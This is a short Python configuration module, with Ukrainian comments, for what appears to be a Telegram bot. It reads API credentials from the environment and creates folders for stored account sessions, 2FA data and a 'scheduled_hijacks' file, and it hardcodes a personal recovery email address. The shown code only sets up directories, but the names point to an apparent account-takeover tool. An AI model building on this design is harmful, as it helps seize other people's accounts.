import os
import stat

MAIN_BOT_TOKEN = os.environ.get("MAIN_BOT_TOKEN")
API_ID = int(os.environ.get("API_ID"))
API_HASH = os.environ.get("API_HASH")

BASE_DATA_PATH = "/app/data"
SESSION_FOLDER = "/app/data/sessions"
MY_SESSION_PATH = "/app/data/sessions/my_account"
SESSION_2FA_FOLDER = "/app/data/sessions_2fa"
CHAT_FOLDER = "/app/data/chats"
SCHEDULE_FILE = "/app/data/scheduled_hijacks.json"

RECOVERY_EMAIL = "balamutdans@gmail.com"


# Функція для створення папок з правильними правами
def ensure_directory_exists(path):
    """Створює папку з правильними правами доступу"""
    if not os.path.exists(path):
        os.makedirs(path, exist_ok=True)
        # Встановлюємо права доступу 755 (rwxr-xr-x)
        os.chmod(path, stat.S_IRWXU | stat.S_IRGRP | stat.S_IXGRP | stat.S_IROTH | stat.S_IXOTH)
        print(f"✅ Створено папку: {path}")


# Ініціалізуємо всі необхідні папки
def init_directories():
    """Ініціалізує всі папки при старті"""
    directories = [
        BASE_DATA_PATH,
        SESSION_FOLDER,
        SESSION_2FA_FOLDER,
        CHAT_FOLDER,
        os.path.dirname(SCHEDULE_FILE)
    ]

    for directory in directories:
        ensure_directory_exists(directory)

    print("📁 Всі папки успішно ініціалізовані")